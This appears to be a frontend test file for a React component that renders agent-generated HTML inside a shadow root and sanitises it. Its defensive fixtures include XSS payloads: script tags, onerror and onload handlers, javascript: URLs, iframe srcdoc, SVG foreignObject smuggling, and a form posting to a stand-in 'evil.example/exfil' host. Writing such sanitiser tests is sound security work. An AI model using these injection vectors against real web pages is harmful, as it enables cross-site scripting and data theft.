import { render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import RichArtifactEmbed, { rewriteCSS } from "./RichArtifactEmbed";

const ARTIFACT_HTML = `<!doctype html><html><head>
<style>
  :root { --paper: #f5f0e8; }
  body { background: #d4cfc7; padding: 2rem; }
  .page { color: var(--paper); }
</style>
</head><body><div class="page" id="content">Page body</div></body></html>`;

describe("rewriteCSS", () => {
  it("rewrites :root to :host", () => {
    expect(rewriteCSS(":root { --x: 1; }")).toContain(":host {");
  });

  it("rewrites body selector at rule start", () => {
    expect(rewriteCSS("body { padding: 1rem; }")).toContain(".artifact-body {");
  });

  it("rewrites body in selector lists", () => {
    expect(rewriteCSS("html, body { margin: 0; }")).toContain(
      ".artifact-body, .artifact-body",
    );
  });

  it("does not touch unrelated identifiers that start with body", () => {
    // .body-of-work should not become ..artifact-body-of-work.
    const out = rewriteCSS(".body-of-work { color: red; }");
    expect(out).toBe(".body-of-work { color: red; }");
  });

  it("rewrites html selector at rule start", () => {
    expect(rewriteCSS("html { font-size: 16px; }")).toContain(
      ".artifact-body {",
    );
  });

  it("collapses html body descendant chain so common resets still match", () => {
    // Without the collapse step, `html body` would rewrite to
    // `.artifact-body .artifact-body`, which never matches (we only mount
    // one synthetic wrapper). Verify both the basic chain and the longer
    // `html body main` shape stay applicable to the artifact root.
    expect(rewriteCSS("html body { margin: 0 }")).toContain(".artifact-body {");
    expect(rewriteCSS("html body main { padding: 1rem }")).toContain(
      ".artifact-body main {",
    );
  });
});

describe("<RichArtifactEmbed>", () => {
  it("mounts the artifact in a shadow root with no iframe", async () => {
    render(<RichArtifactEmbed title="Q4 outlook" html={ARTIFACT_HTML} />);

    const host = await screen.findByLabelText("Q4 outlook", {
      selector: "rich-artifact-embed",
    });
    expect(host.closest("figure")).not.toBeNull();
    expect(document.querySelector("iframe")).toBeNull();

    // Shadow root is attached and the artifact body is reachable via the
    // synthetic .artifact-body wrapper that rewriteCSS targets.
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      expect(shadow).not.toBeNull();
      expect(shadow.querySelector(".artifact-body")).not.toBeNull();
      expect(shadow.querySelector("#content")?.textContent).toBe("Page body");
    });
  });

  it("strips script tags + on* handlers + javascript: URLs even if the server sanitiser ever lets one through", async () => {
    // Belt-and-suspenders defence-in-depth. The broker's
    // validateRichArtifactHTML should never let any of this reach us, but
    // the client-side DOMPurify layer (Layer 2 in the mountArtifact trust
    // comment) is what protects the parent origin when removing the
    // iframe boundary. If this test regresses, the parent origin is
    // exposed to an entire class of XSS bypasses.
    const adversarial = `<!doctype html><html><head>
<style>.x{color:red}</style>
</head><body>
<p id="ok">visible content</p>
<script>window.__pwned = "broker-sanitizer-bypass"</script>
<img src="x" onerror="window.__pwned2 = 'event-handler-bypass'">
<a id="badlink" href="javascript:window.__pwned3='js-url-bypass'">click</a>
<iframe srcdoc="<script>window.__pwned4='nested-iframe'</script>"></iframe>
<object data="x.swf"></object>
<form action="https://evil.example/exfil"><input name="x"></form>
</body></html>`;

    render(<RichArtifactEmbed title="Adversarial" html={adversarial} />);
    const host = await screen.findByLabelText("Adversarial", {
      selector: "rich-artifact-embed",
    });
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      // Benign content survives.
      expect(shadow.querySelector("#ok")?.textContent).toBe("visible content");
      // Script-bearing constructs are gone.
      expect(shadow.querySelector("script")).toBeNull();
      expect(shadow.querySelector("iframe")).toBeNull();
      expect(shadow.querySelector("object")).toBeNull();
      expect(shadow.querySelector("form")).toBeNull();
      expect(shadow.querySelector("input")).toBeNull();
      // Event handlers are stripped.
      const img = shadow.querySelector("img");
      expect(img?.getAttribute("onerror")).toBeNull();
      // javascript: URL is removed from the anchor.
      const link = shadow.querySelector("#badlink");
      const href = link?.getAttribute("href") ?? "";
      expect(href.toLowerCase().startsWith("javascript:")).toBe(false);
    });
    // None of the pwn flags were assigned — DOMPurify swallowed the script
    // content during parse, so even the cloneNode path couldn't execute it.
    expect(
      (window as unknown as Record<string, string>).__pwned,
    ).toBeUndefined();
    expect(
      (window as unknown as Record<string, string>).__pwned2,
    ).toBeUndefined();
    expect(
      (window as unknown as Record<string, string>).__pwned3,
    ).toBeUndefined();
    expect(
      (window as unknown as Record<string, string>).__pwned4,
    ).toBeUndefined();
  });

  it("copies <html> and <body> class/dir/lang/data-* onto the wrapper so body.dark, html[dir=rtl], body[data-theme] selectors still match", async () => {
    const html = `<!doctype html>
<html lang="en" dir="rtl">
<head><style>
  .artifact-body[dir="rtl"] { color: rgb(7, 8, 9); }
  .artifact-body.dark[data-theme="paper"] { background: rgb(1, 2, 3); }
</style></head>
<body class="dark extra" data-theme="paper" data-track="123">
<p id="ok">visible</p>
</body>
</html>`;
    render(<RichArtifactEmbed title="Wrapper attrs" html={html} />);
    const host = await screen.findByLabelText("Wrapper attrs", {
      selector: "rich-artifact-embed",
    });
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      const wrap = shadow.querySelector(".artifact-body") as HTMLElement;
      expect(wrap).not.toBeNull();
      // body attrs merged.
      expect(wrap.classList.contains("dark")).toBe(true);
      expect(wrap.classList.contains("extra")).toBe(true);
      expect(wrap.classList.contains("artifact-body")).toBe(true);
      expect(wrap.getAttribute("data-theme")).toBe("paper");
      expect(wrap.getAttribute("data-track")).toBe("123");
      // html-level attrs merged.
      expect(wrap.getAttribute("dir")).toBe("rtl");
      expect(wrap.getAttribute("lang")).toBe("en");
    });
  });

  it("does not copy event handlers, style, src, or href from <body> onto the wrapper", async () => {
    // Defence-in-depth: the sanitiser drops these from elements inside
    // the body, but the wrapper-attribute copier runs over the
    // unsanitised doc head/body, so it has its own allow-list of attribute
    // names. If a future refactor weakens copyHostAttributes, this test
    // catches it.
    const html = `<!doctype html>
<html onclick="window.__html_pwned=1">
<body class="ok" onclick="window.__body_pwned=1" style="background: url(javascript:1)" src="https://evil.example/x">
<p id="ok">visible</p>
</body>
</html>`;
    render(<RichArtifactEmbed title="No bad attrs" html={html} />);
    const host = await screen.findByLabelText("No bad attrs", {
      selector: "rich-artifact-embed",
    });
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      const wrap = shadow.querySelector(".artifact-body") as HTMLElement;
      expect(wrap.classList.contains("ok")).toBe(true);
      expect(wrap.getAttribute("onclick")).toBeNull();
      expect(wrap.getAttribute("style")).toBeNull();
      expect(wrap.getAttribute("src")).toBeNull();
    });
    expect(
      (window as unknown as Record<string, number>).__html_pwned,
    ).toBeUndefined();
    expect(
      (window as unknown as Record<string, number>).__body_pwned,
    ).toBeUndefined();
  });

  describe("SVG handling", () => {
    // Agents emit SVG diagrams (`<svg><rect/><path/>…`) as part of rich
    // artifacts. The original sanitizer blanket-dropped <svg>; here we
    // verify the safe SVG subset survives while every known SVG-borne XSS
    // vector is still rejected.

    it("renders a safe SVG diagram with shapes and gradients", async () => {
      const html = `<!doctype html><html><body>
<svg id="diagram" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="g"><stop offset="0%" stop-color="red"/><stop offset="100%" stop-color="blue"/></linearGradient>
  </defs>
  <rect width="100" height="100" fill="url(#g)"/>
  <circle cx="50" cy="50" r="20" fill="white"/>
  <text x="50" y="55" text-anchor="middle">ok</text>
</svg>
</body></html>`;
      render(<RichArtifactEmbed title="Diagram" html={html} />);
      const host = await screen.findByLabelText("Diagram", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        expect(shadow.querySelector("svg")).not.toBeNull();
        expect(shadow.querySelector("rect")).not.toBeNull();
        expect(shadow.querySelector("circle")).not.toBeNull();
        expect(shadow.querySelector("linearGradient")).not.toBeNull();
        expect(shadow.querySelector("text")?.textContent).toBe("ok");
      });
    });

    it("strips <script> inside <svg>", async () => {
      const html = `<!doctype html><html><body>
<svg><script>window.__svg_pwned = 1</script><rect width="10" height="10"/></svg>
</body></html>`;
      render(<RichArtifactEmbed title="SVG script" html={html} />);
      const host = await screen.findByLabelText("SVG script", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        expect(shadow.querySelector("svg")).not.toBeNull();
        expect(shadow.querySelector("script")).toBeNull();
      });
      expect(
        (window as unknown as Record<string, number>).__svg_pwned,
      ).toBeUndefined();
    });

    it("strips <foreignObject> so it cannot smuggle <iframe> back in", async () => {
      const html = `<!doctype html><html><body>
<svg><foreignObject><iframe src="https://evil.example"></iframe></foreignObject></svg>
</body></html>`;
      render(<RichArtifactEmbed title="SVG foreignObject" html={html} />);
      const host = await screen.findByLabelText("SVG foreignObject", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        // Use a case-insensitive walk because SVG element names are
        // case-sensitive in the DOM (foreignObject vs foreignobject).
        const tagNames = Array.from(shadow.querySelectorAll("*")).map((el) =>
          el.tagName.toLowerCase(),
        );
        expect(tagNames).not.toContain("foreignobject");
        expect(tagNames).not.toContain("iframe");
      });
    });

    it("strips on* event handlers from svg root and inner shapes", async () => {
      const html = `<!doctype html><html><body>
<svg id="root" onload="window.__svg_load=1">
  <rect id="r" width="10" height="10" onclick="window.__svg_click=1"/>
</svg>
</body></html>`;
      render(<RichArtifactEmbed title="SVG events" html={html} />);
      const host = await screen.findByLabelText("SVG events", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        const svg = shadow.querySelector("svg");
        const rect = shadow.querySelector("rect");
        expect(svg).not.toBeNull();
        expect(rect).not.toBeNull();
        expect(svg?.getAttribute("onload")).toBeNull();
        expect(rect?.getAttribute("onclick")).toBeNull();
      });
      expect(
        (window as unknown as Record<string, number>).__svg_load,
      ).toBeUndefined();
      expect(
        (window as unknown as Record<string, number>).__svg_click,
      ).toBeUndefined();
    });

    it("removes javascript: URLs from xlink:href inside SVG", async () => {
      const html = `<!doctype html><html><body>
<svg>
  <a id="badlink" xlink:href="javascript:window.__svg_href=1"><rect width="10" height="10"/></a>
  <a id="goodlink" xlink:href="#defId"><rect width="10" height="10"/></a>
</svg>
</body></html>`;
      render(<RichArtifactEmbed title="SVG xlink" html={html} />);
      const host = await screen.findByLabelText("SVG xlink", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        const bad = shadow.querySelector("#badlink");
        const good = shadow.querySelector("#goodlink");
        expect(bad).not.toBeNull();
        // javascript: scheme dropped from xlink:href on the bad anchor.
        const badHref =
          bad?.getAttributeNS("http://www.w3.org/1999/xlink", "href") ??
          bad?.getAttribute("xlink:href") ??
          "";
        expect(badHref.toLowerCase().startsWith("javascript:")).toBe(false);
        // Internal fragment reference is preserved on the good anchor.
        const goodHref =
          good?.getAttributeNS("http://www.w3.org/1999/xlink", "href") ??
          good?.getAttribute("xlink:href") ??
          "";
        expect(goodHref).toBe("#defId");
      });
      expect(
        (window as unknown as Record<string, number>).__svg_href,
      ).toBeUndefined();
    });

    it("strips SMIL animation tags that can fire JS via event-like sinks", async () => {
      const html = `<!doctype html><html><body>
<svg>
  <rect width="10" height="10">
    <animate attributeName="x" from="0" to="50" dur="1s"/>
    <set attributeName="fill" to="red"/>
  </rect>
</svg>
</body></html>`;
      render(<RichArtifactEmbed title="SVG animate" html={html} />);
      const host = await screen.findByLabelText("SVG animate", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        const tagNames = Array.from(shadow.querySelectorAll("*")).map((el) =>
          el.tagName.toLowerCase(),
        );
        expect(tagNames).toContain("svg");
        expect(tagNames).toContain("rect");
        expect(tagNames).not.toContain("animate");
        expect(tagNames).not.toContain("set");
      });
    });
  });

  describe("URL allowlist (relative-only)", () => {
    // The href/src/xlink:href allowlist permits ONLY fragments, true relative
    // paths, data:image/* (non-SVG), and data:font/*. Everything else —
    // including http:/https:/mailto: and protocol-relative "//host" — is
    // stripped in both the DOMPurify hook and the deterministic post-sweep.

    it("strips http(s) src on <img> so external network refs cannot leak", async () => {
      const html = `<!doctype html><html><body>
<img id="ext" src="https://evil.test/x.png" alt="x">
</body></html>`;
      render(<RichArtifactEmbed title="External img" html={html} />);
      const host = await screen.findByLabelText("External img", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        const img = shadow.querySelector("#ext");
        expect(img).not.toBeNull();
        expect(img?.getAttribute("src")).toBeNull();
      });
    });

    it("strips data:image/svg+xml src (SVG can carry inline script)", async () => {
      const svgData =
        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3C/svg%3E";
      const html = `<!doctype html><html><body>
<img id="svgdata" src="${svgData}" alt="x">
</body></html>`;
      render(<RichArtifactEmbed title="SVG data img" html={html} />);
      const host = await screen.findByLabelText("SVG data img", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        const img = shadow.querySelector("#svgdata");
        expect(img).not.toBeNull();
        expect(img?.getAttribute("src")).toBeNull();
      });
    });

    it("keeps data:image/png src (safe inline raster)", async () => {
      const pngData =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
      const html = `<!doctype html><html><body>
<img id="png" src="${pngData}" alt="x">
</body></html>`;
      render(<RichArtifactEmbed title="PNG data img" html={html} />);
      const host = await screen.findByLabelText("PNG data img", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        const img = shadow.querySelector("#png");
        expect(img?.getAttribute("src")).toBe(pngData);
      });
    });

    it("keeps a fragment href on an anchor", async () => {
      const html = `<!doctype html><html><body>
<a id="frag" href="#section">jump</a>
</body></html>`;
      render(<RichArtifactEmbed title="Frag href" html={html} />);
      const host = await screen.findByLabelText("Frag href", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        expect(shadow.querySelector("#frag")?.getAttribute("href")).toBe(
          "#section",
        );
      });
    });

    it("keeps a true relative src on <img>", async () => {
      const html = `<!doctype html><html><body>
<img id="rel" src="./rel.png" alt="x">
</body></html>`;
      render(<RichArtifactEmbed title="Relative img" html={html} />);
      const host = await screen.findByLabelText("Relative img", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        expect(shadow.querySelector("#rel")?.getAttribute("src")).toBe(
          "./rel.png",
        );
      });
    });

    it("strips a protocol-relative //host src", async () => {
      const html = `<!doctype html><html><body>
<img id="protorel" src="//evil.test/x.png" alt="x">
</body></html>`;
      render(<RichArtifactEmbed title="Proto-rel img" html={html} />);
      const host = await screen.findByLabelText("Proto-rel img", {
        selector: "rich-artifact-embed",
      });
      await waitFor(() => {
        const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
          .shadowRoot;
        const img = shadow.querySelector("#protorel");
        expect(img).not.toBeNull();
        expect(img?.getAttribute("src")).toBeNull();
      });
    });
  });

  it("re-mounts when the html prop changes", async () => {
    const { rerender } = render(
      <RichArtifactEmbed
        title="A"
        html="<!doctype html><html><body><p id='p'>one</p></body></html>"
      />,
    );
    const host = await screen.findByLabelText("A", {
      selector: "rich-artifact-embed",
    });
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      expect(shadow.querySelector("#p")?.textContent).toBe("one");
    });

    rerender(
      <RichArtifactEmbed
        title="A"
        html="<!doctype html><html><body><p id='p'>two</p></body></html>"
      />,
    );
    await waitFor(() => {
      const shadow = (host as HTMLElement & { shadowRoot: ShadowRoot })
        .shadowRoot;
      expect(shadow.querySelector("#p")?.textContent).toBe("two");
    });
  });
});
